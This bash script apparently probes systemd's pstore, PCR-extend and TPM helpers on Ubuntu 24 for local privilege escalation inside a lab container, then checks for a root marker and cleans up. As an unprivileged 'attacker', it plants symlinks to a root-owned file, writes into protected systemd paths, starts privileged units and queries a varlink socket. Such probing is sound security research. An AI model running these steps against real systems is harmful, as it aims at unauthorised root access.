#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"

docker exec -i "$container" bash -s <<'TARGET'
set -euo pipefail

marker=/root/systemd_pcr_pstore_lpe_marker
work=/home/attacker/systemd_pcr_pstore_probe

cleanup() {
  rm -f "$marker" /tmp/systemd_pcr_pstore_*
  rm -rf "$work"
  systemctl stop systemd-pcrextend.socket >/dev/null 2>&1 || true
  systemctl reset-failed systemd-pcrextend.socket systemd-pcrextend@*.service systemd-pstore.service systemd-tpm2-setup.service systemd-pcrmachine.service >/dev/null 2>&1 || true
}
trap cleanup EXIT INT TERM
cleanup

run_attacker() {
  echo "### attacker: $*"
  set +e
  runuser -u attacker -- timeout 15s bash -lc "$*" 2>&1
  rc=$?
  set -e
  echo "rc=$rc"
}

run_root() {
  echo "### root: $*"
  set +e
  timeout 15s bash -lc "$*" 2>&1
  rc=$?
  set -e
  echo "rc=$rc"
}

echo "## target and package proof"
id
id attacker
sed -n '1,8p' /etc/os-release
uname -a
dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' systemd libsystemd0 2>&1 | sort
dpkg-query -S /usr/lib/systemd/systemd-pstore /usr/lib/systemd/systemd-pcrextend /usr/lib/systemd/systemd-pcrlock /usr/lib/systemd/systemd-storagetm 2>&1 | sort

echo "## unit proof"
systemctl list-unit-files 'systemd-pstore.service' 'systemd-pcrextend.socket' 'systemd-pcrextend@.service' 'systemd-pcrlock*.service' 'systemd-storagetm.service' 'systemd-tpm2-setup.service' 'systemd-pcrmachine.service' --no-pager || true
systemctl cat systemd-pstore.service systemd-pcrextend.socket systemd-pcrextend@.service systemd-storagetm.service systemd-tpm2-setup.service systemd-pcrmachine.service --no-pager 2>&1 | sed -n '1,260p'
for u in systemd-pstore.service systemd-pcrextend.socket systemd-pcrextend@foo.service systemd-pcrlock-file-system.service systemd-pcrlock-machine-id.service systemd-storagetm.service systemd-tpm2-setup.service systemd-pcrmachine.service; do
  echo "--- $u"
  systemctl show "$u" -p LoadState -p UnitFileState -p ActiveState -p SubState -p ConditionResult -p FragmentPath -p ExecStart -p Listen 2>&1 || true
done

echo "## filesystem proof"
for p in \
  /usr/lib/systemd/systemd-pstore \
  /usr/lib/systemd/systemd-pcrextend \
  /usr/lib/systemd/systemd-pcrlock \
  /usr/lib/systemd/systemd-storagetm \
  /usr/lib/systemd/systemd-tpm2-setup \
  /sys/fs/pstore \
  /var/lib/systemd/pstore \
  /var/lib/systemd/pcrlock \
  /var/lib/systemd/tpm2-srk-public-key.pem \
  /run/systemd/io.systemd.PCRExtend \
  /run/systemd \
  /run/systemd/system \
  /etc/systemd/pcrlock.d \
  /usr/lib/pcrlock.d; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    stat -Lc '%A %a %U:%G %n type=%F' "$p"
  else
    echo "MISSING $p"
  fi
done
find /sys/fs/pstore /var/lib/systemd/pstore /run/systemd -maxdepth 2 -xdev -ls 2>/dev/null | sed -n '1,180p'

echo "## attacker write and replacement attempts"
run_attacker '
id
mkdir -p "$HOME/systemd_pcr_pstore_probe"
for p in /sys/fs/pstore/attacker /var/lib/systemd/pstore/attacker /var/lib/systemd/pcrlock/attacker /run/systemd/io.systemd.PCRExtend /run/systemd/system/systemd-pstore.service.d/probe.conf /etc/systemd/pcrlock.d/probe.conf /usr/lib/pcrlock.d/probe.conf; do
  echo "--- $p"
  mkdir -p "$(dirname "$p")" 2>/tmp/systemd_pcr_pstore_mkdir.err || true
  ln -sf /root/systemd_pcr_pstore_lpe_marker "$p" 2>/tmp/systemd_pcr_pstore_link.err
  echo "link_rc=$? err=$(cat /tmp/systemd_pcr_pstore_link.err 2>/dev/null)"
  printf owned > "$p" 2>/tmp/systemd_pcr_pstore_write.err
  echo "write_rc=$? err=$(cat /tmp/systemd_pcr_pstore_write.err 2>/dev/null)"
done
'

echo "## attacker service/socket start attempts"
run_attacker '
for u in systemd-pstore.service systemd-pcrextend.socket systemd-pcrlock-file-system.service systemd-pcrlock-machine-id.service systemd-tpm2-setup.service systemd-pcrmachine.service systemd-storagetm.service; do
  echo "--- start $u"
  systemctl start "$u" 2>&1
  echo start_rc=$?
done
'

echo "## root condition check for low-risk socket/service"
run_root 'systemctl start systemd-pcrextend.socket 2>&1; echo pcrextend_start_rc=$?; systemctl status systemd-pcrextend.socket --no-pager -l 2>&1 | sed -n "1,80p"; stat -Lc "%A %a %U:%G %n type=%F" /run/systemd/io.systemd.PCRExtend 2>&1 || true'
run_attacker '
python3 - <<PY
import socket
p="/run/systemd/io.systemd.PCRExtend"
s=socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
try:
    s.settimeout(2)
    s.connect(p)
    print("pcrextend_connect=connected")
    s.sendall(b"{\"method\":\"org.varlink.service.GetInfo\",\"parameters\":{}}\\0")
    print("pcrextend_recv=", s.recv(256))
except Exception as e:
    print("pcrextend_connect_error=", repr(e))
finally:
    s.close()
PY
'
run_root 'systemctl start systemd-pstore.service 2>&1; echo pstore_start_rc=$?; systemctl status systemd-pstore.service --no-pager -l 2>&1 | sed -n "1,100p"'

echo "## direct helper execution as attacker"
run_attacker '
for cmd in \
  "/usr/lib/systemd/systemd-pstore" \
  "/usr/lib/systemd/systemd-pcrextend --graceful --machine-id" \
  "/usr/lib/systemd/systemd-pcrlock --help" \
  "/usr/lib/systemd/systemd-storagetm --help" \
  "/usr/lib/systemd/systemd-tpm2-setup --help"; do
  echo "--- $cmd"
  timeout 5s bash -lc "$cmd" 2>&1 | sed -n "1,80p"
  echo helper_rc=${PIPESTATUS[0]}
done
touch /root/systemd_pcr_pstore_lpe_marker 2>/dev/null || true
test -e /root/systemd_pcr_pstore_lpe_marker && echo direct_root_marker || echo no_direct_root_marker
'

echo "## root proof before cleanup"
if [ -e "$marker" ]; then
  echo ROOT_PROOF=yes
  stat -Lc '%A %a %U:%G %n' "$marker"
  cat "$marker" 2>/dev/null || true
else
  echo ROOT_PROOF=no
fi

cleanup

echo "## cleanup and health"
for p in "$marker" "$work" /tmp/systemd_pcr_pstore_write.err /tmp/systemd_pcr_pstore_link.err /tmp/systemd_pcr_pstore_mkdir.err /run/systemd/io.systemd.PCRExtend; do
  [ -e "$p" ] || [ -L "$p" ] && echo "LEFT $p" || echo "ABSENT $p"
done
systemctl is-system-running || true
systemctl --failed --no-legend || true
TARGET
